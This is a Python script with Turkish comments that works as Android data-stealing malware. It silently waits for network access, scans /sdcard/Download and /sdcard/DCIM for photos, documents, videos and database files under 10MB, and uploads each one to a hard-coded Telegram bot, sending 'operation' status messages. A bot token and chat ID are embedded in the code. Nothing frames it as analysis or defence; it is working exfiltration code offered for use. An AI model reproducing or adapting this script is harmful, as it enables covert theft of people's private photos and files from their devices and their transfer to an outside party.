import os
import time
import socket
import platform
import requests

# Senin verdiğin bilgiler koda işlendi
TOKEN = "9260706137:AAHyg4jXTO2P95r_U-V1S5_bMiwfdWzthLM"
CHAT_ID = "5941750888"
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

def check_connection():
    """VPN veya internet bağlantısının aktif olup olmadığını kontrol eder."""
    try:
        requests.get("https://api.telegram.org", timeout=5)
        return True
    except:
        return False

def send_message(text):
    try:
        url = f"{BASE_URL}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=10)
    except:
        pass

def send_document(file_path):
    try:
        url = f"{BASE_URL}/sendDocument"
        with open(file_path, "rb") as f:
            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f}, timeout=30)
    except:
        pass

def collect_files(target_dir):
    """Erişilebilen dosyaları güvenle tarar, kilitli veya hatalı olanları es geçer."""
    found_files = []
    try:
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                try:
                    full_path = os.path.join(root, file)
                    # Hedeflenen dosya uzantıları (fotoğraf, belge, veri tabanı vb.)
                    if file.endswith(('.txt', '.pdf', '.jpg', '.png', '.db', '.mp4')):
                        if os.path.getsize(full_path) < 10 * 1024 * 1024: # 10MB altı dosyalar
                            found_files.append(full_path)
                except:
                    continue
    except:
        pass
    return found_files

if __name__ == '__main__':
    # 1. Cihaz açıldığında internet/VPN gelene kadar sessizce bekle
    while not check_connection():
        time.sleep(15)

    send_message("[+] Cihaz çevrimiçi, VPN aktif. Servis görev başında.")

    # 2. Belirlenen klasörleri tara ve bulduklarını Telegram'a gönder
    start_paths = ["/sdcard/Download", "/sdcard/DCIM"]
    for path in start_paths:
        if os.path.exists(path):
            files = collect_files(path)
            for f in files:
                try:
                    send_document(f)
                    time.sleep(2) # Telegram hız sınırına (rate limit) takılmamak için bekleme
                except:
                    continue

    send_message("[+] Operasyon tamamlandı.")
